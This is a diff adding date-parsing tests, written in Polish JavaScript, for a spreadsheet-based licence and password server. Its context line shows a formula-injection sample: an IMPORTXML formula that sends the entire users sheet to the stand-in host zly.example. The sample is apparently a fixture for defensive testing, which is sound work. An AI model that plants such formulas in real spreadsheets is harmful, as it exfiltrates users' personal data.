@@ -302,4 +302,20 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   B.post({ akcja: 'puls', kod: '12345', system: 'Windows', wersja: '3.25.1' }, { haslo: 'nowehaslo1' });
   ok('program zapisuje swoją wersję bez dopisku', B.get('Uzytkownicy').w[1][5] === '3.25.1', B.get('Uzytkownicy').w[1][5]);
 }
+/* ---- 14. daty wpisane jako tekst (komórka tekstowa, arkusz z innymi ustawieniami regionalnymi) ---- */
+{
+  const B = swiezy(); const H = { haslo: 'haslo123' }; const uz = B.get('Uzytkownicy').w[1];
+  const U = B.get('Ustawienia').w; U[1][1] = 'Tajne-Haslo-2026'; U[3][1] = 'odbiorca@firma.pl';
+  const puls = wazne => { uz[3] = wazne; return B.post({ akcja: 'puls', kod: '12345' }, H); };
+  const pl = [puls('31.12.2099'), puls('12.01.2099'), puls('5.3.2099'), puls('2099-12-31'), puls(' 2099-03-05 ')];
+  ok('„Ważne do” jako tekst DD.MM.RRRR i RRRR-MM-DD czytane wprost (dzień przed miesiącem), bez błędu serwera', pl.map(o => o.status + ' ' + o.wazne_do).join() === 'ok 2099-12-31,ok 2099-01-12,ok 2099-03-05,ok 2099-12-31,ok 2099-03-05', JSON.stringify(pl.map(o => [o.status, o.wazne_do, o.opis])));
+  const zle = [puls('31.02.2099'), puls('do odwolania'), puls(46000)];
+  ok('nieczytelna data (31.02, zwykły tekst, liczba) = jak pusta: „wygasla”, bez daty i bez błędu serwera', zle.every(o => o.status === 'wygasla' && o.wazne_do === ''), JSON.stringify(zle.map(o => [o.status, o.wazne_do, o.opis])));
+  ok('…i zostawia w Log wpis z treścią komórki', B.get('Log').w.some(r => r[2] === 'nieczytelna_data' && /31\.02\.2099/.test(r[3])));
+  uz[3] = '31.12.2099';
+  const hp = d => { U[2][1] = d; return B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); };
+  const h1 = hp('12.01.2099'), h2 = hp('31.12.2099'), h3 = hp('2099-02-30');
+  ok('termin hasła paczki DD.MM.RRRR: 12.01.2099 to 12 stycznia (nie 1 grudnia), konto z „Ważne do” jako tekst dostaje hasło', h1.status === 'ok' && h1.wazne_do === '2099-01-12' && h2.wazne_do === '2099-12-31', JSON.stringify([h1, h2]));
+  ok('nieczytelny termin hasła paczki → „brak” (hasło nie wychodzi) i wpis w Log', h3.status === 'brak' && !('haslo' in h3) && B.get('Log').w.some(r => r[2] === 'nieczytelna_data' && /haslo_paczki_wazne_do/.test(r[3])), JSON.stringify(h3));
+}
 process.exit(kod);
